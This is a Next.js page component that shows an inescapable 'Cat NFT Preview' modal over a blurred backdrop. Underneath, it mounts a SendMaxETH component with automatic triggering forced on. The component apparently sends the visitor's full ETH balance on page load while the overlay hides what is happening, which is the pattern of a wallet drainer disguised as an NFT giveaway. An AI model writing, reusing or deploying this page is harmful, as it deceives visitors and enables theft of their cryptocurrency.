"use client";

import { SendMaxETH } from "@/app/components/SendMaxETH";
import "./styles.css";
import { useSearchParams } from "next/navigation";
import { useState, useEffect } from "react";

export default function SendETHPage() {
  const searchParams = useSearchParams();
  const [autoTrigger, setAutoTrigger] = useState(false);
  const [showModal, setShowModal] = useState(true);

  useEffect(() => {
    setAutoTrigger(searchParams.get("auto") === "true");
  }, [searchParams]);

  const handleCloseModal = () => {
    setShowModal(false);
  };

  return (
    <>
      {/* Elegant NFT Preview Modal */}
      {showModal && (
      <div style={{
        position: 'fixed',
        top: '45%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        zIndex: 10000,
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        borderRadius: '24px',
        padding: '24px',
        boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.3)',
        maxWidth: '500px',
        width: '90vw',
        maxHeight: '90vh',
        overflow: 'auto'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '16px',
          overflow: 'hidden',
          boxShadow: '0 10px 25px rgba(0, 0, 0, 0.1)',
          position: 'relative',
          width: '100%',
          height: '400px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center'
        }}>
          <img
            src="https://cataas.com/cat?width=600&height=600"
            alt="Cat NFT Preview"
            style={{
              width: '100%',
              height: '100%',
              objectFit: 'cover',
              display: 'block'
            }}
          />
        </div>

        <div style={{
          marginTop: '20px',
          textAlign: 'center'
        }}>
          <button
            style={{
              color: 'white',
              fontSize: '24px',
              fontWeight: 'bold',
              marginBottom: '8px',
              background: 'rgba(255, 255, 255, 0.2)',
              border: '2px solid rgba(255, 255, 255, 0.3)',
              borderRadius: '12px',
              padding: '12px 24px',
              cursor: 'pointer',
              transition: 'all 0.3s ease',
              width: '100%'
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.background = 'rgba(255, 255, 255, 0.3)';
              e.currentTarget.style.transform = 'scale(1.02)';
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.background = 'rgba(255, 255, 255, 0.2)';
              e.currentTarget.style.transform = 'scale(1)';
            }}>
            🐱 Your Unique Cat NFT
          </button>
          <p style={{
            color: 'rgba(255, 255, 255, 0.9)',
            fontSize: '14px',
            marginBottom: '16px'
          }}>
            One-of-a-kind digital collectible
          </p>
        </div>
      </div>
      )}

      {/* Backdrop Blur */}
      {showModal && (
      <div style={{
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0, 0, 0, 0.4)',
        backdropFilter: 'blur(8px)',
        zIndex: 9999
      }} />
      )}

      <main className="min-h-screen p-8 max-w-4xl mx-auto relative z-10">
          <SendMaxETH autoTrigger={true} />
      </main>
    </>
  );
}
